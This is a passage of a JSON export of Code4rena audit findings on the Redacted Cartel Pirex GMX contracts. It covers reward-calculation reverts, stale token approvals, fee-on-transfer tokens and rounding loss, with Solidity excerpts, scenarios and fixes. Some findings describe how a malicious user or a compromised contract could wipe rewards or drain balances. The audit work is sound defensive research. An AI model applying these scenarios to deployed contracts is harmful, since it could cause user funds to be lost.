executed and update this balance in deposits and withdraws and claims so it can detect rewards that directly transferred to contract without call to `compound()`."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/295", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-36"], "target": "2022-11-redactedcartel-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-redactedcartel-findings/blob/main/data/0xfuje-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/250", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-17"], "target": "2022-11-redactedcartel-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-redactedcartel-findings/blob/main/data/keccak123-G.md)."}, {"title": "PirexGmx#migrateReward() may cause users to lose Reward.", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/249", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-11"], "target": "2022-11-redactedcartel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L940-L949   # Vulnerability details  ## Impact  PirexGmx#migrateReward() may cause users to lose Reward. before PirexRewards.sol set new PirexGmx  ## Proof of Concept  The current migration process is: call # completemigration ()-> # migrateward ()  After this method, the producer of PirexRewards.sol contract is still the old PirexGmx.   At this time, if AutoPxGmx#compound () is called by bot:  AutoPxGmx#compound() -> PirexRewards#.claim() -> old_PirexGmx#claimRewards()  Old_PirexGmx#claimRewards () will return zero rewards  and the reward of AutopXGMX will be lost.   old PirexGmx still can execute https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L824-L828  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L940-L949  ## Tools Used  ## Recommended Mitigation Steps  There are two ways to solve the problem. 1. set the producer of PirexRewards to the new PirexGmx in completeMigration (). 2. In #migrateReward (), set the old PirexGmx's \"pirexRewards\" to address(0), so that you can't use the old PirexGmx to get rewards  Simply use the second, such as: ```solidity     function migrateReward() external whenPaused {         if (msg.sender != migratedTo) revert NotMigratedTo();         if (gmxRewardRouterV2.pendingReceivers(address(this)) != address(0))             revert PendingMigration();          // Transfer out any remaining base reward (ie. WETH) to the new contract         gmxBaseReward.safeTransfer(             migratedTo,             gmxBaseReward.balanceOf(address(this))         ); +       pirexRewards ==address(0);   //*** set pirexRewards=0,Avoid claimRewards () being called by mistake.***//     } ``` ``` "}, {"title": "_calculateRewards() in PirexGmx don't handle reward calculation properly, and it would revert when totalSupply() is zero which will cause claimRewards() to revert if one of 4 rewardTracker's totalSupply was zero", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/237", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-10"], "target": "2022-11-redactedcartel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L733-L816 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L228-L267 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexRewards.sol#L332-L348   # Vulnerability details  ## Impact Function `claimRewards()` in `PirexGmx` claims WETH and esGMX rewards and multiplier points (MP) from GMX protocol. it uses `_calculateRewards()` to calculate the unclaimed reward token amounts produced for each token type. but because of the lack of checks, function `_calculateRewards()` would revert when `RewardTracker.distributor.totalSupply()` is zero so if any of 4 `RewardTracker`s has zero `totalSupply()` then function `claimRewards()` would revert too and function `harvest()` in `PirexRewards` contract would revert too because it calls `PirexGmx.claimRewards()`. `harvest()` is used in `claim()` function so `claim()` would not work too. This bug would harvesting rewards for `PirexRewards` contract and claiming reward for users from `PirexRewards` when supply of one of `RewardTracker`s contracts in GMX protocol is zero. Function `claimRewards()` is written based on GMX code, but the logic is not correctly copied because in GMX protocol contract checks for `totalSupply()` and it prevents this bug from happening.  ## Proof of Concept This is function `_calculateRewards()`'s code in `PirexGmx`: ```    function _calculateRewards(bool isBaseReward, bool useGmx)         internal         view         returns (uint256)     {         RewardTracker r;          if (isBaseReward) {             r = useGmx ? rewardTrackerGmx : rewardTrackerGlp;         } else {             r = useGmx ? stakedGmx : feeStakedGlp;         }          address distributor = r.distributor();         uint256 pendingRewards = IRewardDistributor(distributor)             .pendingRewards();         uint256 distributorBalance = (isBaseReward ? gmxBaseReward : esGmx)             .balanceOf(distributor);         uint256 blockReward = pendingRewards > distributorBalance             ? distributorBalance             : pendingRewards;         uint256 precision = r.PRECISION();         uint256 cumulativeRewardPerToken = r.cumulativeRewardPerToken() +             ((blockReward * precision) / r.totalSupply());          if (cumulativeRewardPerToken == 0) return 0;          return             r.claimableReward(address(this)) +             ((r.stakedAmounts(address(this)) *                 (cumulativeRewardPerToken -                     r.previousCumulatedRewardPerToken(address(this)))) /                 precision);     } ``` As you can see in the line `uint256 cumulativeRewardPerToken = r.cumulativeRewardPerToken() + ((blockReward * precision) / r.totalSupply())` if `totalSupply()` was zero then code would revert because of division by zero error. so if `RewardTracker.distributor.totalSupply()` was zero then function `_calculateRewards` would revert and won't work and other function using `_calculateRewards()` would be break too.  This is part of function `claimRewards()`'s code in `PirexGmx` contract: ```     function claimRewards()         external         onlyPirexRewards         returns (             ERC20[] memory producerTokens,             ERC20[] memory rewardTokens,             uint256[] memory rewardAmounts         )     {         // Assign return values used by the PirexRewards contract         producerTokens = new ERC20[](4);         rewardTokens = new ERC20[](4);         rewardAmounts = new uint256[](4);         producerTokens[0] = pxGmx;         producerTokens[1] = pxGlp;         producerTokens[2] = pxGmx;         producerTokens[3] = pxGlp;         rewardTokens[0] = gmxBaseReward;         rewardTokens[1] = gmxBaseReward;         rewardTokens[2] = ERC20(pxGmx); // esGMX rewards distributed as pxGMX         rewardTokens[3] = ERC20(pxGmx);          // Get pre-reward claim reward token balances to calculate actual amount received         uint256 baseRewardBeforeClaim = gmxBaseReward.balanceOf(address(this));         uint256 esGmxBeforeClaim = stakedGmx.depositBalances(             address(this),             address(esGmx)         );          // Calculate the unclaimed reward token amounts produced for each token type         uint256 gmxBaseRewards = _calculateRewards(true, true);         uint256 glpBaseRewards = _calculateRewards(true, false);         uint256 gmxEsGmxRewards = _calculateRewards(false, true);         uint256 glpEsGmxRewards = _calculateRewards(false, false); ``` As you can see it calls `_calculateRewards()` to calculate  the unclaimed reward token amounts  produced for each token type in GMX protocol. so function `claimRewards()` would revert too when `totalSupply()` of one of these 4 `RewardTracker`'s distributers was zero. This is part of functions `harvest()` and `claim()` code in `PirexReward` contract: ```     function harvest()         public         returns (             ERC20[] memory _producerTokens,             ERC20[] memory rewardTokens,             uint256[] memory rewardAmounts         )     {         (_producerTokens, rewardTokens, rewardAmounts) = producer             .claimRewards();         uint256 pLen = _producerTokens.length; ....... ...... ......       function claim(ERC20 producerToken, address user) external {         if (address(producerToken) == address(0)) revert ZeroAddress();         if (user == address(0)) revert ZeroAddress();          harvest();         userAccrue(producerToken, user); .... .... .... ``` As you can see `harvest()` calls `claimRewards()` and `claim()` calls `harvest()` so these two function would revert and won't work when `totalSupply()` of one of these 4 `RewardTracker`'s distributers in GMX protocol was zero. in that situation the protocol can't harvest and claim rewards from GMX because of this bug and users won't be able to claim their rewards from the protocol. the condition for this bug could happen from time to time as GMX decided to prevent it by checking the value of `totalSupply()`. This is function `_updateRewards()` code in `RewardTracker` in GMX protocol (https://github.com/gmx-io/gmx-contracts/blob/65e62b62aadea5baca48b8157acb9351249dbaf1/contracts/staking/RewardTracker.sol#L272-L286): ```     function _updateRewards(address _account) private {         uint256 blockReward = IRewardDistributor(distributor).distribute();          uint256 supply = totalSupply;         uint256 _cumulativeRewardPerToken = cumulativeRewardPerToken;         if (supply > 0 && blockReward > 0) {             _cumulativeRewardPerToken = _cumulativeRewardPerToken.add(blockReward.mul(PRECISION).div(supply));             cumulativeRewardPerToken = _cumulativeRewardPerToken;         }          // cumulativeRewardPerToken can only increase .... .... ``` As you can see it checks that `supply > 0` before using it as denominator in division. So GMX protocol handles the case when `totalSupply()` is zero and contract logics won't break when this case happens but function `_calculateRewards()` which tries to calculate GMX protocol rewards beforehand don't handle this case(the case where `totalSupply()` is zero) so the logics would break when this case happens and it would cause function `harvest()` and `claim()` to be unfunctional.  ## Tools Used VIM  ## Recommended Mitigation Steps check that `totalSupply()` is not zero before using it."}, {"title": "broken logic in configureGmxState() of PirexGmx contract because it doesn't properly call safeApprove() for stakedGmx address", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/214", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-09"], "target": "2022-11-redactedcartel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L269-L293 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L346-L355   # Vulnerability details  ## Impact Function `configureGmxState()` of `PirexGmx` is for configuring GMX contract state but logic is using `safeApprove()` improperly, it won't reset approval amount for old `stakedGmx` address This would cause 4 problem: 1. different behavior in `setContract()` and `configureGmxState()` for handling `stakeGmx` address changes. in `setContract()` the logic reset approval for old address to zero but in `configureGmxState()` the logic don't reset old address GMX spending approval. 2. the call to this function would revert if `stakeGmx` address didn't changed but other addresses has been changed so `owner` can't use this to configure contract. 3. contract won't reset approval for old `stakedGmx` addresse which is a threat because contract in that address can steal all the GMX balance any time in the future if that old address had been compromised. 4. contract won't reset approval for old `stakedGmx` addresse, if `owner` use `configureGmxState()` to change the `stakeGmx` value then it won't be possible to set `stakedGmx` value to previous ones by using either `configureGmxState()` or `setContract()` and contract would be in broken state.   ## Proof of Concept This is `configureGmxState()` code in `PirexGmx`: ```     /**         @notice Configure GMX contract state      */     function configureGmxState() external onlyOwner whenPaused {         // Variables which can be assigned by reading previously-set GMX contracts         rewardTrackerGmx = RewardTracker(gmxRewardRouterV2.feeGmxTracker());         rewardTrackerGlp = RewardTracker(gmxRewardRouterV2.feeGlpTracker());         feeStakedGlp = RewardTracker(gmxRewardRouterV2.stakedGlpTracker());         stakedGmx = RewardTracker(gmxRewardRouterV2.stakedGmxTracker());         glpManager = gmxRewardRouterV2.glpManager();         gmxVault = IVault(IGlpManager(glpManager).vault());          emit ConfigureGmxState(             msg.sender,             rewardTrackerGmx,             rewardTrackerGlp,             feeStakedGlp,             stakedGmx,             glpManager,             gmxVault         );          // Approve GMX to enable staking         gmx.safeApprove(address(stakedGmx), type(uint256).max);     } ``` As you can see it just sets the approval for new `stakeGmx` address and don't do anything about spending approval of old `stakeGmx` address. This is part of the `setContract()` code that handels `stakeGmx`: ```         if (c == Contracts.StakedGmx) {             // Set the current stakedGmx (pending change) approval amount to 0             gmx.safeApprove(address(stakedGmx), 0);              stakedGmx = RewardTracker(contractAddress);              // Approve the new stakedGmx contract address allowance to the max             gmx.safeApprove(contractAddress, type(uint256).max);             return;         } ``` As you can see it resets the spending approval of old `stakedGmx` address to zero and then give unlimited spending approval for new address. So the impact #1 is obvious that the code for same logic in two different functions don't beehive similarly.  Function `configureGmxState()` is used for configuring GMX contract state but if `owner` uses this function one time then it won't be possible to call this function the second time if `stakedGmx` wasn't changed. for example in this scenario: 1. owner calls `configureGmxState()` to set values for GMX contract addresses. 2. then address of one of contract changes in GMX (`stakedGmx` stayed the same) and owner want's to call `configureGmxState()` to reset the values of variables to correct ones. 3. owner call to `configureGmxState()` would fail because `stakedGmx` address didn't changed and in the line ` gmx.safeApprove(address(stakedGmx), type(uint256).max);` contract tries to set non zero approval for `stakedGmx` but it already has non zero spending allowance. (`safeApprove()` would revert if the current spending allowance is not zero and the new allowance is not zero either). so the impact #2 would happen and calls to this function in some scenarios would fail and it won't be functional.  Because function `configureGmxState()` don't reset the old `stakeGmx` address's GMX token spending approval to 0x0 so it would be possible to lose all GMX balance of `PirexGmx` contract if the old `stakeGmx` addresses are compromised. for example in this scenario: 1. GMX protocol get hacked(either by a bug or leaking some private keys) and `stakeGmx` contract control would be in hacker's hand. 2. GMX deploy new contracts and `stakeGmx` address changes in GMX. () 3. owner of `PirexGmx` calls `configureGmxState()` to reset the values of GMX contracts addresses in `PirexGmx`.  4. function `configureGmxState()` logic would change the GMX contract addresses but it won't set GMX token spending approval for old `stakeGmx` address to zero. 5. hacker who control the old `stakeGmx` address would use his access to that address contract to withdraw GMX balance of `PirexGmx`. because `PirexGmx` won't set approval for old `stakeGmx` contract so it would be possible for that old `stakeGmx` address to transfer GMX balance of `PirexGmx` anytime in future. the bug in old `stakeGmx` contract or leakage of private keys of `stakeGmx` address(private key who can become the owner or admin of that contract) can be happen after migrating GMX and Pirex contracts too. This is impact #3 scenario.  in scenario #4 contract would stuck in unrecoverable state. the problem is that if `configureGmxState()` is get used more than once and `stakeGmx` variable's value has been changes more than once then it won't be possible to set `stakeGmx` value to old values either with `configureGmxState()` or `setContract()` and the contract won't be useful. the scenario is this: (`safeApprove()` won't allow to set non-zero approval for address that has already non-zero approval amount. see the OZ implementation) 1. GMX protocol changes its `stakeGmx` contract address from old address to new (for any reason, they got hacked or they are migrating or ....) 2. `owner` of `PirexGmx` calls `configureGmxState()` to update GMX protocol's contract address in `PirexGmx` contract and the logic would update the values of variables. (the GMX spending approval for old and new `stakeGmx` address would be max value). 3. GMX protocol changes `stakeGmx` contract address from new value to old value (for any reason, they decided to roll back to old address) 4. owner tries to call `configureGmxState()` to reupdate GMX protocol's address in `PirexGmx` but the call would revert because the code tries to call `safeApprove()` for address that has already non-zero allowance. 5. owner can't call `setContract()` to update value of `stakeGmx` variable because this function tries to call `safeApprove()` to set non-zero approval value for address that already has non-zero allowance. so in this state `owner` can't recover `PirexGmx` contract and because contract has wrong value for `stakeGmx` it won't be functional and it would stay in broken state.   ## Tools Used VIM  ## Recommended Mitigation Steps like `setContract()`, function `configureGmxState()` should set approval for old `PirexGmx` to zero first."}, {"title": "Tokens with fees will break the ``depositGlp()`` logic", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/196", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2022-11-redactedcartel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGlp.sol#L367 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L583   # Vulnerability details  ## Impact In ``PirexGmx`` and ``AutoPxGlp`` you have function ``depositGlp()``, which accepts any ERC20 token from whitelist Now there are 9 tokens (see here: https://arbiscan.io/address/0x489ee077994b6658eafa855c308275ead8097c4a#readContract): ``WBTC, WETH, USDC, LINK, UNI, USDT, MIM, FRAX, DAI`` And the list may extend  So any user can deposit any of those tokens and receive pxGlp token: ```     function testUSDTDepositGlp() external {         // 0 USDT TOKENS         address myAddress = address(this);         assertEq(usdt.balanceOf(myAddress), 0);          // The one with many USDT tokens         vm.prank(0xB6CfcF89a7B22988bfC96632aC2A9D6daB60d641);         uint256 amount = 100000;         usdt.transfer(myAddress, amount);          // amount USDT TOKENS         assertEq(usdt.balanceOf(myAddress), amount);          // DEPOSIT USDT TOKENS         usdt.approve(address(pirexGmx), amount);         pirexGmx.depositGlp(address(usdt), amount, 1, 1, address(this));                  // SUCCESSSFULLY DEPOSITED         assertEq(usdt.balanceOf(address(this)), 0);         assertEq(pxGlp.balanceOf(address(this)), 118890025839780442);     } ```  But if of this tokens will start charge fee on transfers, the logic will be broken and calls to ``depositGlp()`` with suck token will fail  Because here you use the amount of tokens sent from user wallet: https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L512 ```             t.safeTransferFrom(msg.sender, address(this), tokenAmount);              // Mint and stake GLP using ERC20 tokens             deposited = gmxRewardRouterV2.mintAndStakeGlp(                 token,                 tokenAmount,                 minUsdg,                 minGlp             ); ``` And then ``gmxRewardRouterV2`` tries to transfer tokens to his balance from your balance:  ``` IERC20(_token).safeTransferFrom(_fundingAccount, address(vault), _amount); ```  (See https://arbiscan.io/address/0x321f653eed006ad1c29d174e17d96351bde22649#code - GlpManager and https://arbiscan.io/address/0xA906F338CB21815cBc4Bc87ace9e68c87eF8d8F1#code - RewardRouterV2)   But you received less than ``tokenAmount`` tokens because of fee. And transaction will fail   ## Proof of Concept Let's imagine USDT in arbitrub started to charge fees 1% per transfer  Alice wants to deposit 100 USDT through ``PirexGmx.depositGlp()`` Then you do  ``t.safeTransferFrom(Alice, address(this), 100);`` You will receive only 99 USDT  But in the next line you will try to send 100 USDT: ``` deposited = gmxRewardRouterV2.mintAndStakeGlp(                 token,                 tokenAmount,                 minUsdg,                 minGlp             ); ```  So transaction fails and Alice can't get pxGlp tokens    ## Tools Used  vs code  ## Recommended Mitigation Steps  USDT already has fees in other blockchains.  Many of these tokens use proxy pattern (and USDT too). It's quite probably that in one day one of the tokens will start charge fees. Or you would like to add one more token to whitelist and the token will be with fees  Thats why I consider finding as medium severity   To avoid problems, use common pattern, when you check your balance before operation and balance after, like that:  ```             uint256 balanceBefore = t.balanceOf(address(this));             t.safeTransferFrom(msg.sender, address(this), tokenAmount);             uint256 balanceAfter = t.balanceOf(address(this));              uint256 tokenAmount = balanceAfter - balanceBefore;              // Mint and stake GLP using ERC20 tokens             deposited = gmxRewardRouterV2.mintAndStakeGlp(                 token,                 tokenAmount,                 minUsdg,                 minGlp             ); ``` "}, {"title": "User's Accrued Rewards Will Be Lost", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/184", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-04"], "target": "2022-11-redactedcartel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexRewards.sol#L373   # Vulnerability details  ## Proof of Concept  If the user deposits too little GMX compared to other users (or total supply of pxGMX), the user will not be able to receive rewards after calling the `PirexRewards.claim` function. Subsequently, their accrued rewards will be cleared out (set to zero), and they will lose their rewards.  The amount of reward tokens that are claimable by a user is computed in Line 403 of the `PirexRewards.claim` function.  If the balance of pxGMX of a user is too small compared to other users (or total supply of pxGMX), the code below will always return zero due to rounding issues within solidity.  ```solidity uint256 amount = (rewardState * userRewards) / globalRewards; ```  Since the user's accrued rewards is cleared at Line 391 within the `PirexRewards.claim` function (`p.userStates[user].rewards = 0;`), the user's accrued rewards will be lost.  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexRewards.sol#L373  ```solidity File: PirexRewards.sol 368:     /** 369:         @notice Claim rewards 370:         @param  producerToken  ERC20    Producer token contract 371:         @param  user           address  User 372:     */ 373:     function claim(ERC20 producerToken, address user) external { 374:         if (address(producerToken) == address(0)) revert ZeroAddress(); 375:         if (user == address(0)) revert ZeroAddress(); 376:  377:         harvest(); 378:         userAccrue(producerToken, user); 379:  380:         ProducerToken storage p = producerTokens[producerToken]; 381:         uint256 globalRewards = p.globalState.rewards; 382:         uint256 userRewards = p.userStates[user].rewards; 383:  384:         // Claim should be skipped and not reverted on zero global/user reward 385:         if (globalRewards != 0 && userRewards != 0) { 386:             ERC20[] memory rewardTokens = p.rewardTokens; 387:             uint256 rLen = rewardTokens.length; 388:  389:             // Update global and user reward states to reflect the claim 390:             p.globalState.rewards = globalRewards - userRewards; 391:             p.userStates[user].rewards = 0; 392:  393:             emit Claim(producerToken, user); 394:  395:             // Transfer the proportionate reward token amounts to the recipient 396:             for (uint256 i; i < rLen; ++i) { 397:                 ERC20 rewardToken = rewardTokens[i]; 398:                 address rewardRecipient = p.rewardRecipients[user][rewardToken]; 399:                 address recipient = rewardRecipient != address(0) 400:                     ? rewardRecipient 401:                     : user; 402:                 uint256 rewardState = p.rewardStates[rewardToken]; 403:                 uint256 amount = (rewardState * userRewards) / globalRewards; 404:  405:                 if (amount != 0) { 406:                     // Update reward state (i.e. amount) to reflect reward tokens transferred out 407:                     p.rewardStates[rewardToken] = rewardState - amount; 408:  409:                     producer.claimUserReward( 410:                         address(rewardToken), 411:                         amount, 412:                         recipient 413:                     ); 414:                 } 415:             } 416:         } 417:     } ```  The graph below represents the amount of GMX tokens Alice and Bob staked in `PirexGmx` for each second during the period. Note that the graph is not drawn proportionally.  Green = Number of GMX tokens staked by Alice  Blue = Number of GMX tokens staked by Bob  ![](https://user-images.githubusercontent.com/102820284/204132852-f76c8959-5040-46bf-9529-edd0d4a98e41.png)  Based on the above graph:  - Alice staked 1 GMX token for 4 seconds (From T80 to T85) - Bob staked 99999 GMX tokens for 4 seconds (From T80 to T85)  Assume that the emission rate is 0.1 esGMX per 1 GMX staked per second.  In this case, the state variable will be as follows at the end of T83, assuming both the global and all user states have been updated and rewards have been harvested.  - rewardState = 60,000 esGMX tokens (600,000 * 0.1) - globalRewards = 600,000 (100,000 * 6) - Accrued `userRewards` of Alice = 6 - Accrued `userRewards` of Bob = 599,994 (99,999 * 6)  Following is the description of `rewardState` for reference:  > The `rewardState` represents the total number of a specific ERC20 reward token (e.g. WETH or esGMX) held by a producer (e.g. pxGMX or pxGPL).  > > The `rewardState` of each reward token (e.g. WETH or esGMX) will increase whenever the rewards are harvested by the producer (e.g. `PirexRewards.harvest` is called). On the other hand, the `rewardState` will decrease if the users claim the rewards.  At the end of T85, Alice should be entitled to 1.2 esGMX tokens (0.2/sec * 6).  Following is the formula used in the `PirexRewards` contract to compute the number of reward tokens a user is entitled to.   ```solidity amount = (rewardState * userRewards) / globalRewards; ```  If Alice claims the rewards at the end of T85, she will get zero esGMX tokens instead of 1.2 esGMX tokens.  ```solidity amount = (rewardState * userRewards) / globalRewards; 60,000 * 6 / 600,000 360,000/600,000 = 0.6 = 0 ```  Since Alice's accrued rewards are cleared at Line 391 within the `PirexRewards.claim` function (`p.userStates[user].rewards = 0;`), Alice's accrued rewards will be lost. Alice will have to start accruing the rewards from zero after calling the `PirexRewards.claim` function.  Another side effect is that since the 1.2 esGMX tokens that belong to Alice are still in the contract, they will be claimed by other users.  ## Impact  Users who deposit too little GMX compared to other users (or total supply of pxGMX), the user will not be able to receive rewards after calling the `PirexRewards.claim` function. Also, their accrued rewards will be cleared out (set to zero). Loss of reward tokens for the users.  Additionally, the `PirexRewards.claim` function is permissionless, and anyone can trigger the claim on behalf of any user. A malicious user could call the `PirexRewards.claim` function on behalf of a victim at the right time when the victim's accrued reward is small enough to cause a rounding error or precision loss, thus causing the victim accrued reward to be cleared out (set to zero).  ## Recommended Mitigation Steps  Following are some of the possible remediation actions:  #### 1. Use `RewardPerToken ` approach  Avoid calculating the rewards that the users are entitled based on the ratio of `userRewards` and `globalRewards`.  Instead, consider implementing the RewardPerToken for users and global, as seen in many of the well-established reward contracts below, which is not vulnerable to this issue:  - https://github.com/fei-protocol/flywheel-v2/blob/dbe3cb81a3dc2e46536bb8af9c2bdc585f63425e/src/FlywheelCore.sol#L226 - https://github.com/Synthetixio/synthetix/blob/2cb4b23fe409af526de67dfbb84aae84b2b13747/contracts/StakingRewards.sol#L61  #### 2. Fallback logic if`amount ==  0`  If the `amount` is zero, revert the transaction. Alternatively, if the `amount` is zero, do not clear out the user's accrued reward state variable since the user did not receive anything yet.  ```diff function claim(ERC20 producerToken, address user) external { ..SNIP..    uint256 amount = (rewardState * userRewards) / globalRewards;     if (amount != 0) {     // Update reward state (i.e. amount) to reflect reward tokens transferred out     p.rewardStates[rewardToken] = rewardState - amount;      producer.claimUserReward(      address(rewardToken),      amount,      recipient     ); -   } +   } else { +    revert ZeroRewardTokens(); +   } ..SNIP.. } ```"}, {"title": "Deposit Feature Of The Vault Will Break If Update To A New Platform", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/182", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-07"], "target": "2022-11-redactedcartel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L73 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L152   # Vulnerability details  ## Proof of Concept  During initialization, the `AutoPxGMX` vault will grant max allowance to the platform (PirexGMX) to spend its GMX tokens in Line 97 of the constructor method below. This is required because the vault needs to deposit GMX tokens to the platform (PirexGMX) contract. During deposit, the platform (PirexGMX) contract will pull the GMX tokens within the vault and send them to GMX protocol for staking. Otherwise, the deposit feature within the vault will not work.  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L73  ```solidity File: AutoPxGmx.sol 73:     constructor( 74:         address _gmxBaseReward, 75:         address _gmx, 76:         address _asset, 77:         string memory _name, 78:         string memory _symbol, 79:         address _platform, 80:         address _rewardsModule 81:     ) Owned(msg.sender) PirexERC4626(ERC20(_asset), _name, _symbol) { 82:         if (_gmxBaseReward == address(0)) revert ZeroAddress(); 83:         if (_gmx == address(0)) revert ZeroAddress(); 84:         if (_asset == address(0)) revert ZeroAddress(); 85:         if (bytes(_name).length == 0) revert InvalidAssetParam(); 86:         if (bytes(_symbol).length == 0) revert InvalidAssetParam(); 87:         if (_platform == address(0)) revert ZeroAddress(); 88:         if (_rewardsModule == address(0)) revert ZeroAddress(); 89:  90:         gmxBaseReward = ERC20(_gmxBaseReward); 91:         gmx = ERC20(_gmx); 92:         platform = _platform; 93:         rewardsModule = _rewardsModule; 94:  95:         // Approve the Uniswap V3 router to manage our base reward (inbound swap token) 96:         gmxBaseReward.safeApprove(address(SWAP_ROUTER), type(uint256).max); 97:         gmx.safeApprove(_platform, type(uint256).max); 98:     } ```  However, when the owner calls the `AutoPxGmx.setPlatform` function to update the `platform` to a new address, it does not grant any allowance to the new platform address. As a result, the new platform (PirexGMX) will not be able to pull the GMX tokens from the vault. Thus, the deposit feature of the vault will break, and no one will be able to deposit.  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L152  ```solidity File: AutoPxGmx.sol 152:     function setPlatform(address _platform) external onlyOwner { 153:         if (_platform == address(0)) revert ZeroAddress(); 154:  155:         platform = _platform; 156:  157:         emit PlatformUpdated(_platform); 158:     } ```  ## Impact  The deposit feature of the vault will break, and no one will be able to deposit.  ## Recommended Mitigation Steps  Ensure that allowance is given to the new platform address so that it can pull the GMX tokens from the vault.  ```diff function setPlatform(address _platform) external onlyOwner {     if (_platform == address(0)) revert ZeroAddress(); +   if (_platform == platform) revert SamePlatformAddress();      +   gmx.safeApprove(platform, 0); // set the old platform approval amount to zero +   gmx.safeApprove(_platform, type(uint256).max); // approve the new platform contract address allowance to the max      platform = _platform;      emit PlatformUpdated(_platform); } ```"}, {"title": "Users Receive Less Rewards Due To Miscalculations", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/177", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-02"], "target": "2022-11-redactedcartel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexRewards.sol#L305 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexRewards.sol#L281 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexRewards.sol#L373   # Vulnerability details  ## Background  The amount of rewards accrued by global and user states is computed by the following steps:  1. Calculate seconds elapsed since the last update (`block.timestamp - lastUpdate`) 2. Calculate the new rewards by multiplying seconds elapsed by the last supply (`(block.timestamp - lastUpdate) * lastSupply`) 3. Append the new rewards to the existing rewards (`rewards = rewards + (block.timestamp - lastUpdate) * lastSupply`)  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexRewards.sol#L305  ```solidity /**     @notice Update global accrual state     @param  globalState    GlobalState  Global state of the producer token     @param  producerToken  ERC20        Producer token contract */ function _globalAccrue(GlobalState storage globalState, ERC20 producerToken)  internal {     uint256 totalSupply = producerToken.totalSupply();     uint256 lastUpdate = globalState.lastUpdate;     uint256 lastSupply = globalState.lastSupply;      // Calculate rewards, the product of seconds elapsed and last supply     // Only calculate and update states when needed     if (block.timestamp != lastUpdate || totalSupply != lastSupply) {         uint256 rewards = globalState.rewards +             (block.timestamp - lastUpdate) *             lastSupply;                          globalState.lastUpdate = block.timestamp.safeCastTo32();             globalState.lastSupply = totalSupply.safeCastTo224();             globalState.rewards = rewards;     ..SNIP.. } ```  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexRewards.sol#L281  ```solidity /**     @notice Update user rewards accrual state     @param  producerToken  ERC20    Rewards-producing token     @param  user           address  User address */ function userAccrue(ERC20 